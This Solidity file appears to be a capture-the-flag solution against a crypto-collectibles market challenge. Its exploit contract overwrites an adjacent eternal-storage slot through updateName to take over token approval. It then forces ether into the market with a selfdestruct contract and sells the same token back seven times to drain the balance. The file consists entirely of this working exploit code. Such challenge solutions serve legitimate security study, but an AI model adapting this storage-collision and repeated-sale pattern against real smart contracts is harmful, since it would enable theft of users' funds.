pragma solidity ^0.7.0;

import "./Setup.sol";

contract Sender {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}


contract DappSolve {
    event log_uint            (uint256);
    event log_address            (address);
    event log_bytes32(bytes32 b);

    constructor(Setup _setup) payable {
        CryptoCollectiblesMarket market = _setup.market();
        CryptoCollectibles token = _setup.token();
        EternalStorageAPI eStorage = _setup.eternalStorage();

        bytes32 tokenId = market.mintCollectibleFor{value: 11 ether}(address(this));
        bytes32 tokenIdMin1 = bytes32(uint256(tokenId) - uint256(1));

        bytes32 payload = bytes32(uint256(address(this)));
        eStorage.updateName(tokenId, payload);
        eStorage.updateName(tokenIdMin1, payload);

        (new Sender){value: 9 ether}(payable(address(market)));

        // Sell token back
        for (uint256 i = 0; i < 7; i++) {
            token.approve(tokenId, address(market));
            market.sellCollectible(tokenId);
            eStorage.updateApproval(tokenIdMin1, address(this));
        }
    }
}
